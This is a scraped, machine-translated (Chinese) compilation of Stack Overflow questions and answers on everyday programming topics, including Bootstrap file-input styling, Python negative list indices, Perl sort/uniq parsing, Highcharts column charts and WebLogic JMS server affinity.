    'inputWidthPorcent': 65,
    'classButton': 'btn btn-primary',
    'classInput': 'form-control file-input-button',
    'classIcon': 'icon-folder-open'
};

$.fn.filestyle.noConflict = function () {
    $.fn.filestyle = old;
    return this;
};

// Data attributes register
$('.filestyle').each(function () {
    var $this = $(this),
        options = {
            'buttonText': $this.attr('data-buttonText'),
            'input': $this.attr('data-input') === 'false' ? false : true,
            'icon': $this.attr('data-icon') === 'false' ? false : true,
            'classButton': $this.attr('data-classButton'),
            'classInput': $this.attr('data-classInput'),
            'classIcon': $this.attr('data-classIcon')
        };

    $this.filestyle(options);
});
})(window.jQuery); 
```

* * *

## 回答 #19

> 赞同：2
> 
> 时间：2016-09-29T06:55:24.617

我修改了@claviska 答案并按我喜欢的方式工作（Bootstrap 3、4 未测试）：

```
<label class="btn btn-default">
    <span>Browse</span>
    <input type="file" style="display: none;" onchange="$(this).prev('span').text($(this).val()!=''?$(this).val():'Browse')">
</label> 
```

* * *

## 回答 #20

> 赞同：2
> 
> 时间：2016-12-31T05:56:19.710

[![在此处输入图像描述](../Images/ec11fb203d4e56462ffae05a9cd5d314.png)](https://i.stack.imgur.com/odErf.png)

以下代码如上图所示

**html**

```
<form>
<div class="row">
<div class="col-lg-6">
<label for="file">
<div class="input-group">
<span class="input-group-btn">
<button class="btn btn-default" type="button">Browse</button>
</span>
<input type="text" class="form-control" id="info" readonly="" style="background: #fff;" placeholder="Search for...">
</div><!-- /input-group -->
</label>
</div><!-- /.col-lg-6 -->
</div>

</div>
<input type="file" style="display: none;" onchange="$('#info').val($(this).val().split(/[\\|/]/).pop()); " name="file" id="file">
</form> 
```

**Javascript**

```
<script type="text/javascript">

$(function() {
    $("label[for=file]").click(function(event) {
        event.preventDefault();
        $("#file").click();
    });
});

</script> 
```

* * *

## 回答 #21

> 赞同：1
> 
> 时间：2014-03-27T08:12:06.950

我有同样的问题，我尝试这样。

```
<div>
<button type='button' class='btn btn-info btn-file'>Browse</button>
<input type='file' name='image'/>
</div> 
```

CSS

```
<style>
.btn-file {
    position:absolute;
}
</style> 
```

JS

```
<script>
$(document).ready(function(){
    $('.btn-file').click(function(){
        $('input[name="image"]').click();
    });
});
</script> 
```

> 注意：按钮 .btn-file 必须与输入文件在同一个标​​签中

希望您找到最佳解决方案...

* * *

## 回答 #22

> 赞同：1
> 
> 时间：2015-04-13T22:08:57.783

在 Bootstrap v.3.3.4 中尝试以下操作

```
<div>
    <input id="uplFile" type="file" style="display: none;">

    <div class="input-group" style="width: 300px;">
        <div  id="btnBrowse"  class="btn btn-default input-group-addon">Select a file...</div>
        <span id="photoCover" class="form-control">
    </div>
</div>

<script type="text/javascript">
    $('#uplFile').change(function() {
        $('#photoCover').text($(this).val());
    });

    $('#btnBrowse').click(function(){
        $('#uplFile').click();
    });
</script> 
```

* * *

## 回答 #23

> 赞同：1
> 
> 时间：2015-11-02T11:47:01.590

这是替代技巧，它不是最好的解决方案，但它只是给你一个选择

HTML 代码：

```
<button clss="btn btn-primary" id="btn_upload">Choose File</button>
<input id="fileupload" class="hide" type="file" name="files[]"> 
```

Javascript：

```
$("#btn_upload").click(function(e){
e.preventDefault();
$("#fileupload").trigger('click');
}); 
```

* * *

## 回答 #24

> 赞同：1
> 
> 时间：2018-08-16T12:37:10.110

关于 claviska 答案 - 如果您想在基本文件上传中显示上传的文件名，您可以在输入`onchange`事件中进行。只需使用以下代码：

```
 <label class="btn btn-default">
                    Browse...
                    <span id="uploaded-file-name" style="font-style: italic"></span>
                    <input id="file-upload" type="file" name="file"
                           onchange="$('#uploaded-file-name').text($('#file-upload')[0].value);" hidden>
 </label> 
```

此 jquery JS 代码负责检索上传的文件名：

```
$('#file-upload')[0].value 
```

或者使用香草 JS：

```
document.getElementById("file-upload").value 
```

[![例子](../Images/036da0e078d8c279b056ffd30a422883.png)](https://i.stack.imgur.com/FmRBH.png)

* * *

## 回答 #25

> 赞同：0
> 
> 时间：2013-03-21T16:52:35.280

不需要花哨的shiz：

HTML：

```
<form method="post" action="/api/admin/image" enctype="multipart/form-data">
    <input type="hidden" name="url" value="<%= boxes[i].url %>" />
    <input class="image-file-chosen" type="text" />
    <br />
    <input class="btn image-file-button" value="Choose Image" />
    <input class="image-file hide" type="file" name="image"/> <!-- Hidden -->
    <br />
    <br />
    <input class="btn" type="submit" name="image" value="Upload" />
    <br />
</form> 
```

JS：

```
$('.image-file-button').each(function() {
      $(this).off('click').on('click', function() {
           $(this).siblings('.image-file').trigger('click');
      });
});
$('.image-file').each(function() {
      $(this).change(function () {
           $(this).siblings('.image-file-chosen').val(this.files[0].name);
      });
}); 
```

注意：有问题的三个表单元素必须是彼此的兄弟（.image-file-chosen、.image-file-button、.image-file）

* * *

## 回答 #26

> 赞同：-1
> 
> 时间：2013-09-04T16:41:43.540

[http://markusslima.github.io/bootstrap-filestyle/](http://markusslima.github.io/bootstrap-filestyle/)

```
$(":file").filestyle(); 
```

或者

```
<input type="file" class="filestyle" data-input="false"> 
```

# html - UIWebView baseURL 和绝对路径

> ID：11235207
> 
> 赞同：6
> 
> 时间：2012-06-27T21:41:56.867
> 
> 标签：html, uiwebview, base-url

我有一个这样构造的 HTML 页面：

```
<html>
  <head>
    <link rel="stylesheet" href="/style.css" />
  </head>
  <body>

  </body>
</html> 
```

它存储在我的文档目录中：

```
/Users/username/Library/Application Support/iPhone Simulator/5.1/Applications/12345-ID/Documents/mysite/index.html 
```

我还将 style.css 存储在文档目录中：

```
/Users/username/Library/Application Support/iPhone Simulator/5.1/Applications/12345-ID/Documents/mysite/style.css 
```

但是现在，当我尝试使用以下方法将 html 加载到我的 webview 中时：

```
NSURL *test = [NSURL URLWithString:@"file:///Users/username/Library/Application Support/iPhone%20Simulator/5.1/Applications/12345-ID/Documents/mysite/"]
[myWebView loadHTMLString:<the content retrieved from index.html> baseURL:test]; 
```

未加载 css，当我使用 NSURLProtocol 拦截对样式表的请求时，我可以看到请求是错误的。它试图请求：

> 文件：///style.css

而不是完整的 baseURL。现在我可以通过删除html文件中/style.css前面的/来解决这个问题。但是有没有一种简单的方法可以在不修改 html 的情况下在本机代码中解决这个问题？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-06-28T06:26:16.583

通过以下方式生成路径和基本 url：

```
NSString *path = [[NSBundle mainBundle] bundlePath];
NSURL *baseURL = [NSURL fileURLWithPath:path];
[webView loadHTMLString:htmlString baseURL:baseURL]; 
```

关于这个主题的一个很棒的博客：

[http://iphoneincubator.com/blog/windows-views/uiwebview-revisited](http://iphoneincubator.com/blog/windows-views/uiwebview-revisited)

关于该主题的 SO QA

[UIWebView 和本地 css 文件](https://stackoverflow.com/questions/2032159/uiwebview-and-local-css-file)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-23T09:27:50.007

删除斜线是唯一的解决方案

# amazon-web-services - AWS 云上的 Twig 模板管理器错误

> ID：11235208
> 
> 赞同：1
> 
> 时间：2012-06-27T21:41:58.003
> 
> 标签：amazon-web-services, twig

我希望我能找到详细了解 Twig 的人。我用 Twig 开发了几个网站，我真的很满意。现在我正在尝试将网站放入 AWS 云中。通常它工作正常，但有时在新部署后我收到以下错误消息：

致命错误：在第 99 行的 /var/www/html/lib/twig/lib /Twig/Extension/Core.php 中找不到类 'Twig_TokenParser_If' 调用堆栈：0.0001 633192 1\. {main}() /var/www/ html/index.php:0 0.1184 1516544 2\. Twig_Environment->render() /var/www/html/index.php:13 0.1184 1516544 3\. Twig_Environment->loadTemplate() /var/www/html/lib/twig/ lib/Twig/Environment.php:283 0.1186 1518664 4\. Twig_Environment->compileSource() /var/www/html/lib/twig/lib/Twig/Environment.php:314 0.1228 1692688 5\. Twig_Environment->parse() / var/www/html/lib/twig/lib/Twig/Environment.php:523 0.1231 1713752 6\. Twig_Parser->parse() /var/www/html/lib/twig/lib/Twig/Environment.php:473 0.1231 1715296 7\. Twig_Environment->getTokenParsers() /var/www/html/lib/twig/lib/Twig/Parser.php:74 0.1233 1731256 8\. Twig_Extension_Core->getTokenParsers() /var/www/html/lib/twig/lib/Twig/Environment.php:694

如果我在云中建立一个新环境并部署完全相同的应用程序（所有文件都相同），它就可以工作。我不想在新版本上设置所有内容。如果有人知道可能是什么错误，请帮助我。谢谢

# joomla - 在 Joomla 的管理员中向模块参数表单添加自定义样式的最简单方法是什么？

> ID：11235209
> 
> 赞同：2
> 
> 时间：2012-06-27T21:41:58.980
> 
> 标签：joomla

我的简单模块使用 3 个字段、2 个文本输入和一个 tinymce textarea，但 textarea 看起来坏了。[http://img151.imageshack.us/img151/8648/joomla464.jpg](http://img151.imageshack.us/img151/8648/joomla464.jpg)

这是我的配置：

```
<config>
    <fields name="params">
        <fieldset name="basic">
            <field name="moduleclass_sfx" type="text" default="" label="Module Class Suffix" description="PARAMMODULECLASSSUFFIX" />
            <field name="url" type="text" default="" label="Paste the url" description="" />
            <field style="clear:both;float:left;background-color:red;" name="description" type="editor" default="default" rows="20" cols="40" />            
        </fieldset>
    </fields>
</config> 
```

泰

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-29T03:24:06.413

你可以将你的CSS添加到

管理员/模板/bluestork/css/template.css（如果您使用默认管理模板）

但是当joomla更新时存在风险，您将丢失您的css...您可以一直复制模板...给它一个不同的名称并在那里更新css。所以你的副本不会受到任何 joomla 更新的影响。

所以在那里添加你的css你只需要使用正确的css选择器。

否则我会使用艺术选择器或类别选择器

```
 <field
                name="category_id"
                type="category"
                description="JGLOBAL_FIELD_CATEGORIES_CHOOSE_CATEGORY_DESC"
                extension="com_content"
                label="JGLOBAL_FIELD_CATEGORIES_CHOOSE_CATEGORY_LABEL"
                show_root="true"
                required="true" /> 
```

并把你需要的任何内容放在一篇文章中......无论如何，你没有太多空间将编辑器放在模块配置的右侧。

# java - Apache Pivot 的可视化 GUI 设计器

> ID：11235212
> 
> 赞同：5
> 
> 时间：2012-06-27T21:42:06.923
> 
> 标签：java, gui-designer, apache-pivot

我从[Java GUI frameworks 问题中了解了 Apache Pivot 的存在。选择什么？Swing、SWT、AWT、SwingX、JGoodies、JavaFX、Apache Pivot？](https://stackoverflow.com/q/7358775/9204)这似乎很适合我当前的项目，因为它涉及让用户动态创建自己的 GUI。但是，我还需要为我选择的任何技术提供可视化 GUI 设计器。Pivot 已经有这样的设计师了吗？谷歌搜索似乎不建议这样做，但我在问以防我错过了一个。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-09T15:13:21.900

我一直在寻找 Pivot 的 GUI 设计器，看起来开发人员在编辑 BXML 时只使用 XML 编辑器。话虽如此，我确实浏览了 Geertjan 的博客，其中提到了一个名为[NB-PIVOT的 NetBeans 初始](http://kenai.com/projects/nb-pivot)[GUI 设计](https://blogs.oracle.com/geertjan/entry/pivot_integration_into_netbeans)器。我不知道这个项目有多活跃。但这是一个开始。

# python - 为什么 Python 返回负列表索引？

> ID：11235213
> 
> 赞同：6
> 
> 时间：2012-06-27T21:42:08.827
> 
> 标签：python

如果我有这个包含 10 个元素的列表：

```
>>> l = [1,2,3,4,5,6,7,8,9,0] 
```

为什么 l[10] 会返回 IndexError，而 l[-1] 返回 0？

```
>>> l[10]
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
IndexError: list index out of range
>>> l[0]
1
>>> l[-1]
0
>>> l[-2]
9 
```

如果列表中没有先前的元素，我想要做的是抛出错误。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-06-27T21:43:02.850

在 Python 中，负数列表索引表示从列表右侧开始计数的项目（即 的`l[-n]`简写`l[len(l)-n]`）。

如果您发现需要负索引来指示错误，那么您可以简单地检查该情况并自己引发异常（或当场处理）：

```
index = get_some_index()
if index < 0:
    raise IndexError("negative list indices are considered out of range")
do_something(l[index]) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-27T21:43:39.247

这是因为`l[-1]`等于`l[len(l)-1]`，同样`l[-2]`等于`l[len(l)-2]`

```
>>> lis=[1,2,3,4,5]
>>> lis[-1],lis[-2],lis[-3]
(5, 4, 3)
>>> lis[len(lis)-1],lis[len(lis)-2],lis[len(lis)-3]
(5, 4, 3) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-27T22:15:58.310

**Q**：为什么会`l[10]`返回一个`IndexError`，但是`l[-1]`返回`0`？

**答**：因为 Python（与许多其他语言一样）中的索引值是从零开始的。这意味着第一项存储在 index `0`。

你的清单

```
l = [1,2,3,4,5,6,7,8,9,0] 
```

有10个项目。由于索引从 开始`0`，最后一项将在 index `9`。当您尝试在 index 处访问您的列表时`10`，Python 会正确地抛出一个`IndexError`异常来告诉您这不是一个有效的索引值并且超出了范围。

Python 还使用负索引值的约定从列表或序列的“末尾”访问项目。索引值`-1`表示列表中的*最后*`-2`一项，倒数第二项等。由于列表中的最后一项是`0`，这就是`l[-1]`返回的内容。

@Lattyware 的回答已经向您展示了如何生成/抛出异常，我希望这能回答您最初的问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-04-09T06:27:57.610

因为，索引值从 0 开始。在您的情况下，最后一个索引值为 9，9 之后不再有索引值。当您尝试打印超出索引值限制的值时，它必须抛出错误

# iphone - 究竟在哪里放置“... [UIApplication sharedApplication] openURL ...”？

> ID：11235222
> 
> 赞同：3
> 
> 时间：2012-06-27T21:42:49.233
> 
> 标签：iphone, objective-c, ios

我正在尝试制作一个表格单元格，当点击它时会拨打电话号码，我认为我必须使用的代码是；

> [[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"tel:thenumber"]];

但是发生的情况是，一旦打开应用程序，调用就会自动发出，因此我认为问题在于代码的位置。
为了实现所需的单元功能，需要将其放置在哪里？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T21:58:59.530

在

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-27T21:59:08.650

它应该放在 `-(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath` tableview 的委托中的方法中。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-06-27T22:59:37.353

谢谢大家的正确回答，但是（在您的帮助下）我找到了一个更简单的解决方案；

```
- (void)didTap_tableViewCell2:(UIView *)cell {
[[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"tel:thenumber"]]; } 
```

# colorbox - 带地址栏的彩盒

> ID：11235243
> 
> 赞同：0
> 
> 时间：2012-06-27T21:44:27.347
> 
> 标签：colorbox

我是一个 javascript 假人。我下载了colorbox和jquery。他们工作得很好。我按照教程阅读了示例代码，但我无法弄清楚。当我打开一个颜色框时，它会打开正确的网址，然后我可以单击框中的链接并浏览其他网站。这一切都很棒。我需要在窗口顶部的地址块中显示 url。当我使用 java 弹出窗口时，它会正常工作。您可以转到其他网址，地址显示在窗口顶部的地址栏中。所以我假设我可以用 colorbox 做到这一点。这将使我的页面看起来比普通的弹出窗口好得多。这可以做到吗。这是我的代码。

```
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js">             </script>
          <script src="http://www.mysite.com/colorbox/jquery.colorbox.js"></script>
          <link rel="stylesheet" href="http://www.mysite.com/colorbox/colorbox.css"    />

<script>
parent.jQuery.colorbox.close();
    $(function ()
    {

        $(".iframe").colorbox({iframe:true, width:"80%", height:"80%"});

})

   </script> 
```

和我打开盒子的链接

```
<a class='iframe' href="http://www.ebay.com">ebay </a></p> 
```

如果你选择帮助我请求你告诉我新代码的去向。如果您告诉我添加一行代码，我将不明白该放在哪里。我正在努力学习 javascript，但我是一个非常新手。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T17:15:20.377

鉴于 ColorBox 的默认设计和您的技能组合，我认为 ColorBox 不是适合您使用的插件。ColorBox 并非设计为“类似浏览器”并让用户浏览其他网站。

可以更改该设计假设，但它需要比您承认的更高级的 JS 技能。

也许您可以通过简单地使用纯 HTML 锚标记 ( `<a>`) 并使用“target=”参数打开一个新的浏览器实例来实现您的目标。

最好的，

KJM

# android - 有没有办法让 FlipperView 转到任何封闭的视图，而不是骑自行车穿过它们？

> ID：11235244
> 
> 赞同：0
> 
> 时间：2012-06-27T21:44:28.970
> 
> 标签：android, viewflipper

我为 Flipperview 编写了一个小测试程序。我有 3 个视图。我调用 startFlipping() 来引入下一个视图，所以它从第一个视图、第二个、第三个视图返回到第一个视图

你有没有一种方法，而不是去下一个视图，我可以让脚蹼直接进入 3 个不同视图中的任何一个？？？？

如果没有，有没有办法隐藏垂直容器？也许我可以有 3 个垂直容器，隐藏 2 个，显示一个？

代码：

```
public class TestviewflipperActivity extends Activity implements
    OnClickListener{
    /** Called when the activity is first created. */
    ViewFlipper mFlipper;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        // add listeners
        View mButA = findViewById(R.id.flipbut);
        mButA.setOnClickListener(this);

        mFlipper = (ViewFlipper)findViewById(R.id.flipper);

        View mBut = findViewById(R.id.back_btna);
        mBut.setOnClickListener(this);

    }

    public void onClick(View v) {

mFlipper.startFlipping();   
    }
} 
```

和布局：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:orientation="vertical" >

    <Button android:text="Go Back" 
           android:id="@+id/flipbut"
        android:layout_width="fill_parent" 
        android:layout_height="wrap_content" />

  <ViewFlipper android:id="@+id/flipper"
              android:layout_width="fill_parent" 
              android:layout_height="fill_parent">

   <LinearLayout android:layout_width="fill_parent"
             android:layout_height="fill_parent" 
             android:orientation="vertical"           
                android:id="@+id/screenA"
             >

   <TextView android:layout_width="wrap_content" 
             android:layout_height="wrap_content"
          android:text="TEST screen a" 
          android:layout_gravity="center" 
          android:padding="15dip"
          android:textSize="22dip" />

   <Button android:text="Go Back" 
           android:id="@+id/back_btna"
        android:layout_width="fill_parent" 
        android:layout_height="wrap_content" />

  </LinearLayout>

    <LinearLayout android:layout_width="fill_parent"
                 android:layout_height="fill_parent" 
                 android:orientation="vertical"           
                    android:id="@+id/screenB"
                 >

       <TextView android:layout_width="wrap_content" 
                 android:layout_height="wrap_content"
              android:text="screenb" 
              android:layout_gravity="center" 
              android:padding="15dip"
              android:textSize="22dip" />

       <Button android:text="Go Back" 
               android:id="@+id/back_btnb"
            android:layout_width="fill_parent" 
            android:layout_height="wrap_content" />

      </LinearLayout>

    <LinearLayout android:layout_width="fill_parent"
                 android:layout_height="fill_parent" 
                 android:orientation="vertical"           
                    android:id="@+id/screenC"
                 >

       <TextView android:layout_width="wrap_content" 
                 android:layout_height="wrap_content"
              android:text="screenC" 
              android:layout_gravity="center" 
              android:padding="15dip"
              android:textSize="22dip" />

       <Button android:text="Go Back" 
               android:id="@+id/back_btnc"
            android:layout_width="fill_parent" 
            android:layout_height="wrap_content" />

      </LinearLayout>

     </ViewFlipper>

    </LinearLayout> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T21:55:35.933

您应该能够使用`mFlipper.setDisplayedChild(int whichChild)`它来使其符合您在代码中所需的视图。该方法在`ViewFlipper`的父级中定义[`ViewAnimator`](http://developer.android.com/reference/android/widget/ViewAnimator.html#setDisplayedChild%28int%29)。

# c# - 使用类型约束实现泛型类时出错

> ID：11235247
> 
> 赞同：1
> 
> 时间：2012-06-27T21:44:40.387
> 
> 标签：c#, .net, oop, c#-4.0

我有一个通用基类，我想允许两种类型中的一种`ITest`或`IBoldface`.

我的基类如下所示：

```
public abstract class BaseTestingCollections<T> where T : ITest, IBoldface
{
...
} 
```

继承它的类之一如下所示：

```
public class TestCollection : BaseTestingCollections<ITest>, ITestCollection
{
...
} 
```

当我编译我得到这个错误：

DomainLogic.ITest 类型不能用作泛型类型或方法“DomainLogic.BaseTestingCollections”中的类型参数“T”。没有从“DomainLogic.ITest”到“DomainLogic.IBoldface”的隐式引用转换。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-27T21:49:01.713

这种非此即彼的限制是无法做到的（我相信你已经注意到，逗号更像是`&&`比`||`）。您可以使用不同的名称（一个`BaseTestingCollectionsTest<T> where T : ITest`，另一个`BaseTestingCollectionsBoldface<T> where T : IBoldface`）创建两个不同的抽象类，或者删除静态限制并在运行时进行检查。或者，如果它们共享成员，则制作其中一个`ITest`或`IBoldface`扩展另一个，或扩展一个公共接口。

这是运行时检查的示例：

```
public abstract class BaseTestingCollections<T>
{
    public BaseTestingCollections()
    {
        if (!typeof(ITest).IsAssignableFrom(typeof(T)) && !typeof(IBoldface).IsAssignableFrom(typeof(T)))
            throw new Exception();
    }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-27T21:47:58.760

那么你不满足你指定的约束。`T`必须同时扩展/*实现**和* 。`ITest` *`IBoldFace`*

 *您的约束并不意味着它必须扩展/实现*其中一种*类型 - 它必须同时*执行*。类型参数必须满足*所有*类型约束才能有效。

有关更多信息，请参阅[有关通用约束](http://msdn.microsoft.com/en-us/library/d5x73970.aspx)的 MSDN。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-27T21:48:14.553

根据您自己的通用约束，只有那些实现*了这两者* `ITest`并且`IBoldface`适合您的`BaseTestingCollection`类的通用参数的类型。

不是非此即彼——或者，它怎么可能呢？当您`Bar`从只实现的`ITest`接口调用方法时会发生什么，而后者又不定义任何方法？面对这种情况，编译器该怎么办？ `T``IBoldFace``Bar`

没有合理的行动可以采取。您的约束同时适用于通用参数。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-06-27T21:49:58.850

您不能使用 C# 泛型表达这样的“非此即彼”约束。使用某种通用的基本接口：

```
interface ITestOrBold {}
interface ITest : ITestOrBold {}
interface IBoldface : ITestOrBold {}

class BaseTestingCollections<T> where T : ITestOrBold {} 
```

`ITestOrBold`显然，您应该有一些明智的抽象来代替。*

# perl - Perl 算法:置换和列表::AllUtils (uniq)

> ID：11235248
> 
> 赞同：4
> 
> 时间：2012-06-27T21:44:45.580
> 
> 标签：perl

```
use Modern::Perl;
use Algorithm::Permute;
use List::AllUtils qw/uniq/;

find_perms(1151);

sub find_perms { 
  my ($value) = @_;
  my @others;
  my @digits = split(//, $value);

  my $perm = Algorithm::Permute->new( \@digits );

  while (my @next = $perm->next()) { 
    my $number = join('', @next);
    push @others, $number;
  }
  @others = sort uniq @others;

  # this one works correctly
  # @others = sort ( uniq( @others ));

  say "FOUND @others";
}

Output:
FOUND 1115 1115 1115 1115 1115 1115 1151 1151 1151 1151 1151 1151 1511 1511 1511 1511 1511 1511 5111 5111 5111 5111 5111 5111 
```

你好，

在发现[Algorithm::Permute](http://search.cpan.org/perldoc/Algorithm%3a%3aPermute)正在产生重复项后，很可能是由于“1151”中的 '1' 数量我决定使用`uniq`. 但是，`sort uniq`不带括号使用不会产生预期的结果。但`sort(uniq(@x))`确实如此。是什么赋予了？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-27T22:00:37.873

[`perldoc -f sort`](http://search.cpan.org/perldoc?perfunc#sort)列出了`sort`函数的三种语法：

```
sort SUBNAME LIST
sort BLOCK LIST
sort LIST 
```

`sort uniq @others`匹配`sort SUBNAME LIST`排序的语法。它期望`uniq`是一个比较全局变量`$a`and的函数`$b`，并返回`<0`,`0`或以指示and`>0`的相对顺序。`$a``$b`

看起来您期望并想要`sort LIST`语法，这就是您说以下之一时所得到的

```
sort(uniq(@others))
sort(uniq @others) 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-06-28T05:06:38.007

[Algorithm::Loops](http://search.cpan.org/perldoc?Algorithm%3a%3aLoops)`NextPermute`不会产生重复，因此无需花费内存和 CPU 来摆脱它们。

```
use Algorithm::Loops qw( NextPermute );

sub find_perms { 
   my @rv;
   my @digits = sort split //, $_[0];
   do {
      push @rv, join '', @digits;
   } while NextPermute(@digits);
   return @rv;
}

say for find_perms(1151); 
```

```
1115
1151
1511
5111 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-06-28T02:26:17.407

虽然[@mob 回答了您提出的问题](https://stackoverflow.com/a/11235399/100754)，但我想指出我不确定您是否愿意`sort uniq`。您仍在存储您不想存储的元素。在这种情况下，最好使用散列。

另外，[当一段数据是字符串时，请使用字符串](http://blog.nu42.com/2012/06/identifier-strings-consisting-solely-of.html)。的输出`find_perms(0345)`可能会让您感到惊讶，但`find_perms('0345')`不会。

最后`Algorithm::Permute::permute`速度非常快。

考虑到这些因素，我会将您的代码重写为：

```
use strict; use warnings;
use Algorithm::Permute qw( permute );

my $uniq_perms = find_perms('115122345');

sub find_perms {
  my ($value) = @_;

  my @digits = split //, $value;
  my %uniq;

  permute { $uniq{join('', @digits)} = undef } @digits;

  return [ keys %uniq ];
} 
```

# javascript - 如何旋转我的 HighCharts 条形图使其垂直而不是水平？

> ID：11235251
> 
> 赞同：30
> 
> 时间：2012-06-27T21:45:00.843
> 
> 标签：javascript, highcharts

![在此处输入图像描述](../Images/7623238ca542621400dbc49ca956702a.png)

```
$(document).ready(function() {
chart1 = new Highcharts.Chart({
    chart: {
        renderTo: 'QueryResultsChart',
        type: 'bar'
    },
    title: {
        text: 'Production History'
    },
    xAxis: {
        title: {
            text: 'Production Day'
        },
        type: 'datetime'
    },
    yAxis: {
        title: {
            text: 'Gross Production'
        }
    },
    series: [{
        name: 'Data',
        data: []
    }]
});
chart1.series[0].setData(". json_encode($aChartData) .");
}); 
```

数据是正确的，它只是出于某种原因在 yAxis 上显示我的 xAxis...

* * *

## 回答 #1

> 赞同：61
> 
> 时间：2012-06-27T22:05:24.050

垂直条形图`column`在 Highchart 中称为 's。

改变这个：

```
type: 'column' //was 'bar' previously` 
```

请参阅此处的示例：http: [//jsfiddle.net/aznBb/](http://jsfiddle.net/aznBb/)

* * *

## 回答 #2

> 赞同：17
> 
> 时间：2014-02-12T21:14:49.427

为了扩展 Moin Zaman 的答案，我玩了他的 jsfiddle [http://jsfiddle.net/aznBb/](http://jsfiddle.net/aznBb/)并找到了这个。

这是**水平**的。

```
chart: {
    type: 'bar',
    inverted: false // default
} 
```

这**也是横向**的。

```
chart: {
    type: 'bar',
    inverted: true
} 
```

这是**垂直**的。

```
chart: {
    type: 'column',
    inverted: false // default
} 
```

这是**水平**的，显然**与条形图相同**。

```
chart: {
    type: 'column',
    inverted: true
} 
```

很奇怪。我只能猜测`type: 'bar'`别名`type: 'column'`和力量，`inverted: true`无论它实际设置什么。如果它只是切换`inverted`布尔值会很好。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-01-11T15:16:02.530

你应该尝试这样的事情：

```
$(function () {

Highcharts.chart('container', {

    chart: {
        type: 'columnrange',
        inverted: false
    },

    title: {
        text: 'Temperature variation by month'
    },

    subtitle: {
        text: 'Observed in Vik i Sogn, Norway'
    },

    xAxis: {
        categories: ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
    },

    yAxis: {
        title: {
            text: 'Temperature ( °C )'
        }
    },

    tooltip: {
        valueSuffix: '°C'
    },

    plotOptions: {
        columnrange: {
            dataLabels: {
                enabled: true,
                formatter: function () {
                    return this.y + '°C';
                }
            }
        }
    },

    legend: {
        enabled: false
    },

    series: [{
        name: 'Temperatures',
        data: [
            [-9.7, 9.4],
            [-8.7, 6.5],
            [-3.5, 9.4],
            [-1.4, 19.9],
            [0.0, 22.6],
            [2.9, 29.5],
            [9.2, 30.7],
            [7.3, 26.5],
            [4.4, 18.0],
            [-3.1, 11.4],
            [-5.2, 10.4],
            [-13.5, 9.8]
        ]
    }]

}); 
```

});

[http://jsfiddle.net/b940oyw4/](http://jsfiddle.net/b940oyw4/)

# java - 客户端 JMS 配置 - JMS 集群 - 仅连接到一台服务器

> ID：11235253
> 
> 赞同：0
> 
> 时间：2012-06-27T21:45:06.177
> 
> 标签：java, jms, weblogic, cluster-computing, session-cookies

因此，我编写了一个程序来连接到 VIP 后面的集群 WebLogic 服务器，该服务器有 4 个服务器和 4 个队列，它们都已连接（我认为他们称它们为分布式......）当我从本地机器运行程序并获取 JMS 连接时，查找消息并断开连接，效果很好。我的意思是：

*   迭代 #1

    *   连接到服务器 1。
    *   找消息
    *   断开连接
*   迭代 #2

    *   连接到服务器 2。
    *   找消息
    *   断开连接

等等。

但是，当我在服务器上运行它时，应用程序会选择一个服务器并坚持使用它。它永远不会选择新服务器，因此其他服务器上的队列永远不会工作。就像“粘性会话”设置一样...我的操作系统是 Win7，服务器操作系统是 Win2008r2 两台机器的 JDK 是相同的。如何配置客户端？服务器实现使用“Apache Procrun”将其作为服务运行。但我还没有看到这部分有太多问题......

是否有会话 cookie 被写入某处？

有任何想法吗？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-27T21:58:08.387

尝试在 JMS Connection factory 上禁用“Server Affinity”。如果您使用的是默认连接工厂，请定义您自己的禁用服务器关联。

**编辑：** 服务器亲和性是服务器端设置，但它控制在 WebLogic JMS 服务器接收到消息后如何将消息路由到消费者。另一种选择是使用循环 DNS 并仅发送到一个解析为不同 IP（托管服务器）的主机名，以便每个连接都转到不同的服务器。

我很确定这是您正在寻找的设置:)

# iphone - 通过方法在任何视图控制器上创建警报

> ID：11235254
> 
> 赞同：0
> 
> 时间：2012-06-27T21:45:13.630
> 
> 标签：iphone, facebook, cocoa-touch, uialertview

> **可能重复：**
> [在 Facebook 请求后在任何视图控制器上创建警报：didFailWithError：](https://stackoverflow.com/questions/11235155/create-an-alert-on-any-view-controller-after-facebook-requestdidfailwitherror)

